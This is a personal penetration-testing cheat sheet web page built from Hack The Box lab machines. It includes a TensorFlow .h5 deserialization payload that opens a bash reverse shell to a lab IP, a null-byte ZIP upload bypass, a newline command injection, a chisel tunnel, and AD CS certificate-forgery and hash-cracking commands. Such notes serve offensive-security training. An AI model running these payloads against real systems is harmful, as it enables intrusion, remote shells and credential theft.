---
layout: splash
title: "Grimoire"
permalink: /grimoire/
author: "sado"
---

# The Pentester's Grimoire

<blockquote id="quote">Loading quote...</blockquote>

<!-- Font Awesome for icons -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<div class="search-container">
  <input type="text" id="searchInput" placeholder="Search the Grimoire..." aria-label="Search the Grimoire" autocomplete="off">
  <button type="button" id="clearSearch" class="btn--clear" title="Clear search" aria-label="Clear search">
    <i class="fas fa-times"></i>
  </button>
  <div id="searchLoader" class="search-loader"></div>
</div>
<div id="searchOverlay" class="search-overlay"></div>

<div class="toc-container">
  <button class="toc-toggle" aria-expanded="false" aria-controls="tocGrid">
    <span class="toc-icon"></span>
    <span class="toc-label">Table of Contents</span>
  </button>
  <div class="toc-grid" id="tocGrid" role="navigation" aria-label="Table of Contents">
    {% assign toc = "Recon & Enumeration,Service-Specific Notes,Web Exploitation,System Exploitation,Post-Exploitation,Active Directory,Credential Attacks,Lateral Movement & Pivoting,Persistence & Evasion,Payloads & Shells,File Transfer & Staging,Useful One-Liners,Tools & Commands,Box Notes / Case Studies,Gotchas & Lessons Learned" | split: "," %}
    {% for label in toc %}
      {% assign cleanLabel = label | replace: ' ', '-' | replace: '&', 'and' | replace: '/', '-' | replace: '.', '' | downcase %}
      <a href="#{{ cleanLabel }}" class="btn--toc" data-section="{{ cleanLabel }}">
        <span class="toc-label">{{ label }}</span>
        <span class="toc-icon"><i class="fas fa-chevron-right"></i></span>
      </a>
    {% endfor %}
  </div>
</div>

<script src="{{ '/assets/js/grimoire-quotes.js' | relative_url }}"></script>
<script src="{{ '/assets/js/grimoire-search.js' | relative_url }}"></script>
<script src="{{ '/assets/js/grimoire-toc.js' | relative_url }}"></script>

## Recon & Enumeration {#recon-and-enumeration}

## Service-Specific Notes {#service-specific-notes}

## Web Exploitation {#web-exploitation}

### TensorFlow `.h5` model deserialization allows arbitrary code execution when a `Lambda()` layer executes malicious Python.
```python
import tensorflow as tf

def exploit(x):
    __import__('os').system("bash -c 'bash -i >& /dev/tcp/10.10.14.46/9001 0>&1'")
    return x

inp = tf.keras.Input(shape=(1,))
x = tf.keras.layers.Dense(1)(inp)
x = tf.keras.layers.Lambda(exploit)(x)
model = tf.keras.Model(inputs=inp, outputs=x)
model.save("full.h5")
```

### Insecure WordPress Plugin Disclosure
- Plugins may expose sensitive data or allow unauthenticated enumeration via debug or backup routes.
- Watch for SQL exports or `.bak`/`.sql` file leaks tied to `/wp-content/plugins/....`

### JWT-Based API Exploitation (From Mobile/Local Apps)
> APIs used by mobile apps or internal web panels often authenticate via JWT tokens. These can sometimes be intercepted, reused, or even generated.

- Look for /login endpoints that return access_token fields.
- Decode with tools like:
```bash
jwt_tool <token>
jwt-cli decode <token>
```

### ZIP Upload Bypass via Null Byte Injection
Some upload validators only check the file extension after a null byte (\x00). This can be abused to upload executable files disguised as safe types (e.g., .php\x00.pdf).
Technique:
- Modify ZIP archive filenames using null byte injection to bypass server-side filters:
```python
item.filename = 'shell.php\x00.pdf'
```
- Upload shell.zip, extract on the server, and access .php file directly.
Tools: zipfile in Python, or zip -r + manual patching.

## System Exploitation {#system-exploitation}

### Used `chisel` to forward local-only ports (e.g., internal admin panels).

```bash
# On attacker (start chisel server)
chisel server -p 9001 --reverse

# On target (connect back and expose internal service)
./chisel client <attacker-ip>:9001 R:9898:127.0.0.1:9898
```

### Command Injection via File Parameters

- API endpoint `/send-image` accepted a `filename` or `output_file` value that was unsanitized — classic command injection vector.
- Injected shellcode via newline:
```bash
"output_file": "test.jpg\nbash /tmp/shell.sh"
```
- Good targets: anything that touches system shell or dynamically builds file paths.

## Post-Exploitation {#post-exploitation}

## Active Directory {#active-directory}
### Shadow Credentials Abuse
> Shadow credentials allow creating fake certificate mappings for AD users. Once applied, you can forge a cert and authenticate as that user.

Steps:
```bash
certipy-ad shadow auto -u user -p pass -account victim -target DC -dc-ip x.x.x.x
```
Then:
```bash
certipy-ad auth -pfx forged_cert.pfx -dc-ip x.x.x.x
```
Use with `evil-winrm` or extract hashes.

### AD CS – Domain Escalation via SeManageVolumePrivilege
> If a user has `SeManageVolumePrivilege`, they can interact with NTFS alternate data streams or abuse volume-level APIs to escalate in AD CS.

Steps:
1. Upload and run exploit:
```powershell
wget https://github.com/CsEnox/SeManageVolumeExploit/releases/download/public/SeManageVolumeExploit.exe
```
2. Dump CA certs:
```powershell
certutil -exportPFX my "CAName" out.pfx
```
3. Forge a cert and impersonate Administrator:
```powershell
certipy-ad forge -ca-pfx out.pfx -upn administrator@domain
```
4. Auth and pull NTLM hashes.

Full post at [AD CS SeManageVolume Exploit]({% link _posts/2025-06-10-SeManageVolumePrivilegeExploit.md %})

## Credential Attacks {#credential-attacks}
### Cracking Extracted Hashes from Application Backups
App backups often contain config files or databases (e.g., .sqlite, .json, .env) with hashed credentials. These are gold for offline cracking.
Common Sources:
- SQLite DBs (users.db, etc.)
- JSON/YAML configs (passwordBcrypt, hash, jwt-secret)
- .env or backup archives (.tar.gz, .zip)

### WordPress Hash Cracking (Portable PHP Hashes)
WordPress uses portable PHP password hashes ($P$), crackable with john:
```bash
john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt wp-users.txt
```
Even partial leaks can lead to low-priv user access (e.g., SSH reuse).

### Database Dump Credential Reuse
Web app databases (like grafana.db) often store credentials in plaintext or reversible formats.
Look for `.db` SQLite files, config `.json`, or hardcoded API tokens.


## Lateral Movement & Pivoting {#lateral-movement-and-pivoting}

## Persistence & Evasion {#persistence-and-evasion}

## Payloads & Shells {#payloads-and-shells}

## File Transfer & Staging {#file-transfer-and-staging}

## Useful One-Liners {#useful-one-liners}

## Tools & Commands {#tools-and-commands}

## Box Notes / Case Studies {#box-notes-and-case-studies}

### Artificial (HTB) – TensorFlow Deserialization & Misconfigured Backups
- Web app accepted `.h5` model uploads — abused TensorFlow deserialization RCE to gain initial shell.
- Used chisel to pivot and access internal service running on localhost.
- Retrieved and cracked user credentials from a backup SQLite DB.
- Gained privilege via:
 - Reading sensitive config from extracted backup.
 - Cracking bcrypt hash for internal backup user (backrest_root).
 - Abused restic to read /root/root.txt.

### BigBang (HTB) – WordPress, JWT API, and Command Injection Chain
- Exposed WordPress plugin (BuddyForms) leaked credential hashes via an insecure SQL endpoint.
- Cracked WordPress hashes → SSH access with low-priv user.
- Found local-only Grafana dashboard running on port 3000 → forwarded via SSH.
- Dumped grafana.db for user credentials → used to authenticate into a backend API.
- Discovered internal API service at localhost:9090 via enumeration and APK reverse engineering.
- Authenticated via JWT → fuzzed API endpoints.
- Found RCE via poorly sanitized parameter in /send-image endpoint (injected shell command).
- Executed payload using JWT-authenticated POST request → gained root.

## Gotchas & Lessons Learned {#gotchas-and-lessons-learned}
- Internal APIs exposed via local-only ports may still use hardcoded or default creds (especially if authenticated via JWT).
- APK reverse engineering can reveal undocumented endpoints or expected request formats.
- JWT tokens are often reusable across CLI, web, and mobile clients — treat them as sensitive secrets.
- Don’t ignore WordPress just because it looks generic — plugins and theme devs frequently mess up access control.
- Null-byte injection is still effective in legacy or poorly filtered upload endpoints.
- ZIP upload attacks often bypass web filters when used alongside directory traversal or filename obfuscation.
- AD environments with misconfigured Certificate Templates or over-permissive delegation are prime targets for certificate forgery.
- Even seemingly low-privileged users may have dangerous privileges like SeManageVolume — always check with whoami /priv.


---
